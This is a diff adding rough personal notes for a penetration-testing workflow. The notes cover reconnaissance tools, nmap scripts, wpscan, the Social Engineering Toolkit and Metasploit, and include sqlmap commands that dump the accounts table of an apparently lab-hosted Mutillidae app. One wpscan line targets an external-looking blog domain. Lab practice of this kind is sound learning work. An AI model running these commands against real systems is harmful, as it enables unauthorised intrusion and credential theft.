@@ -1,0 +1,40 @@
+2.reconassiances
+     1.sublist3r
+         Sublist3r -d <target> -t 3 
+     2.maltego
+     3.osrframework
+        Sudo usufy -n <target>
+     4.theharvester
+
+
+
+4.vulnerability scanning using nmap
+   Sudo nmap --script=http-trace
+    Sudo nmap --script=ssh-run
+
+Then open firefox type ip
+     By scanning http-trace go to /phpMyAdmin, /phpinfo page
+
+    Owasp zap
+    Using wpscan --url.      https:blogs.overandall.com
+
+
+5. Using social engineering toolkit
+     Sudo setoolkit
+
+
+
+7.using metasploit Framework for exploitation 
+
+
+8 using sqlmap 
+
+Sqlmap -u. 'http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=demo&password=deno123&user-info-php-submit-button=View+Account+Details'     --dbs --dump --batch
+
+
+Goto metasploit Framework go sudo nano /var/www/Mutillidae/config.inc change dbname to "owasp10"  then save .
+
+
+sqlmap -u <sameurl> -D owasp10 -T accounts --columns
+
+sqlmap -u <> -D owasp10 -T accounts --dump
